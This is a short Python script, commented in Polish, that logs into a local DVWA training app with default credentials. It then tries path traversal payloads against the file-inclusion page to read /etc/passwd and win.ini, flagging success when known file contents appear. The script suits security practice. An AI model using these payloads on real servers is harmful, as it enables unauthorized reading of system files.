import requests

#atakowany url
attack_url = "http://localhost/dvwa/vulnerabilities/fi/?page="

#typowe payloady omijajace podstawowe zabezpieczenia
payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini"
]

#jesli atak jest udany, to powinno zwrocic ktores z tych
indicators = [
    "root:x:0:0",         
    "[extensions]",       
    "[fonts]",             
    "boot loader",         
]

# glowna funkcja
def test_traversal():
    session = requests.Session()

    #dane logowania (zakladamy brak CSRF)
    login_data = {
        "username": "admin",
        "password": "password",
    }

    # logujemy sie do dvwa
    login_response = session.post("http://localhost/dvwa/login.php", data=login_data)

    # sprawdzamy czy zalogowano
    if "Login failed" in login_response.text:
        print("Logowanie nieudane")
        return

    print("Zalogowano pomyslnie")

    # sprawdzamy kazdy payload
    for payload in payloads:
        url = attack_url + payload
        print(f"Testujemy {url}")  #debug-jaki url testujemy
        try:
            response = session.get(url, timeout=3)
            print(f"Status odpowiedzi: {response.status_code}")  #debug-status http

            #szukamy wskaznikow w tresci odpowiedzi
            for indicator in indicators:
                if indicator in response.text:
                    print(f"Mozliwa podatnosc wykryta z payloadem: {payload}")
                    break

        #klasa except ktora lapie wiekszosc bledow z http
        except requests.exceptions.RequestException as e:
            print(f"nie udalo sie polaczyc {e}")

# odpalamy
if __name__ == "__main__":
    test_traversal()
